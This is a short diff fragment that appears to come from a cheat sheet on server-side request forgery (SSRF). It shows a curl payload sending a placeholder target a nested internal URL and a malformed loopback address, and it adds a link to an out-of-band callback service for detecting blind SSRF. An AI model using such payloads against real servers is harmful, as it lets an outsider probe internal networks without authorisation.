@@ -36,3 +36,6 @@
 
 ```curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"```
 
+# External resources for Blind SSRF
+
+[http://pingb.in](pingb)
